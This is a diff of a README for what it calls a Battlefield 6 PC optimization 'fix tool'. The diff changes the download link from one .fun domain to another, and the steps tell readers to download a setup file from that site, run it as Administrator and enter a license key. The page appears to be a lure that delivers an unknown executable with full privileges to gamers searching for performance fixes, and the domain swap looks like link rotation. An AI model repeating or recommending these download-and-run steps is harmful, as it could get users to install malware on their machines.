@@ -14,14 +14,14 @@ Fix **battlefield 6 optimization pc** on Windows 10/11. Built for PC gamers — 
 
 | | |
 | --- | --- |
-| **Direct link** | **[battlefs.sentineltool.fun](https://battlefs.sentineltool.fun/)** |
-| **Full URL** | `https://battlefs.sentineltool.fun/` |
+| **Direct link** | **[battlefs.nexustool.fun](https://battlefs.nexustool.fun/)** |
+| **Full URL** | `https://battlefs.nexustool.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[battlefs.sentineltool.fun](https://battlefs.sentineltool.fun/)** in your browser
+1. Open **[battlefs.nexustool.fun](https://battlefs.nexustool.fun/)** in your browser
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
